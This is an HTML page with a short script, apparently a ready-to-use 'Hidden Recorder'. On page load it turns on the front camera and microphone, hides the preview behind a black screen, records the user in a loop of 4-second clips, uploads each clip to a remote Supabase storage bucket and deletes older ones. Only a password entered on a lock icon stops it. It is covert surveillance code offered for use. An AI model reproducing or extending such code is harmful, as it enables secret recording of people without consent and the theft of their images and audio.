<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Hidden Recorder</title>
  <script src="https://unpkg.com/@supabase/supabase-js"></script>
  <style>
    body { margin:0; background:black; height:100vh; overflow:hidden; }
    #lock { position:absolute; top:10px; right:10px; color:white; font-size:24px; cursor:pointer; }
    video { display:none; }
  </style>
</head>
<body>
  <div id="lock">üîí</div>
  <video id="preview" autoplay muted playsinline></video>

  <script>
    const SUPABASE_URL = "https://eizhtvtchspiefxutzlg.supabase.co";
    const SUPABASE_KEY = "YOUR-ANON-PUBLIC-KEY"; // <-- apna anon key paste karein
    const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    const BUCKET = "recordings";
    const PASSWORD = "1234"; // <-- yahan apna password dal dein
    let mediaRecorder, chunks = [];
    let recording = true;

    async function startRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, audio: true
        });
        document.getElementById("preview").srcObject = stream;

        mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
        mediaRecorder.ondataavailable = e => chunks.push(e.data);

        mediaRecorder.onstop = async () => {
          if (!recording) return; // agar lock laga to upload na ho
          const blob = new Blob(chunks, { type: "video/webm" });
          chunks = [];

          const fileName = `rec_${Date.now()}.webm`;
          const { error } = await supabase.storage.from(BUCKET).upload(fileName, blob);
          if (error) {
            console.error("Upload failed:", error.message);
          } else {
            console.log("‚úÖ Uploaded:", fileName);
            await cleanupOldFiles();
          }

          // next recording
          if (recording) {
            setTimeout(() => {
              mediaRecorder.start();
              setTimeout(() => mediaRecorder.stop(), 4000);
            }, 100);
          }
        };

        // start first recording
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 4000);

      } catch (err) {
        console.error("Camera error:", err);
        alert("‚ö†Ô∏è Camera/Mic permission allow karna zaroori hai.");
      }
    }

    // Delete old files, keep only last 4
    async function cleanupOldFiles() {
      const { data, error } = await supabase.storage.from(BUCKET).list();
      if (error || !data) return;
      const files = data.sort((a, b) => b.name.localeCompare(a.name));
      const old = files.slice(4); 
      for (const f of old) {
        await supabase.storage.from(BUCKET).remove([f.name]);
      }
    }

    // Lock button
    document.getElementById("lock").addEventListener("click", async () => {
      const input = prompt("Enter password:");
      if (input === PASSWORD) {
        recording = false;
        if (mediaRecorder && mediaRecorder.state !== "inactive") {
          mediaRecorder.stop();
        }
        alert("‚úÖ Recording stopped!");
      } else {
        alert("‚ùå Wrong password!");
      }
    });

    // Start on load
    startRecording();
  </script>
</body>
</html>
